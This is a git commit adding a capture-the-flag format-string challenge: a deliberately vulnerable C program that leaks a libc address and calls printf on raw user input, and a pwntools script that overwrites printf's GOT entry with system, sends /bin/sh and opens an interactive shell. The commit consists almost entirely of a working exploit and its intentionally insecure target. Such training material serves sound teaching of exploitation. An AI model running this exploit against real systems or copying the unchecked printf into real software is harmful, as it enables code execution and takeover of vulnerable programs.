3a501956017f469ea6426e7255a6915a211b9e57
dmur1 <93072266+dmur1@users.noreply.github.com>
2025-02-14 17:35:50 +0000

    add fmt_str_got_overwrite_read

---
+++ pwn/fmt_str/fmt_str_got_overwrite_read/challenge/go.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+#context.log_level = "debug"
+elf = ELF("./task", checksec=False)
+context.binary = elf
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
+
+p = elf.process()
+#p = elf.debug(gdbscript="")
+#p = remote("127.0.0.1", 9001)
+
+leak = int(p.readline().decode(), 16)
+libc.address = leak - libc.sym["setbuf"]
+
+p.sendline(fmtstr_payload(8, {elf.got["printf"]: libc.sym["system"]}))
+
+p.sendline(b"/bin/sh")
+
+p.clean()
+
+p.interactive()
---
+++ pwn/fmt_str/fmt_str_got_overwrite_read/challenge/task.c
@@ -0,0 +1,24 @@
+#include <stdio.h>
+#include <unistd.h>
+
+void setup() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+}
+
+void vuln() {
+    char buf[256];
+
+    printf("%p\n", setbuf);
+
+    for (int i = 0; i < 2; ++i) {
+        read(STDIN_FILENO, buf, sizeof(buf));
+        printf(buf);
+    }
+}
+
+int main() {
+    setup();
+    vuln();
+}
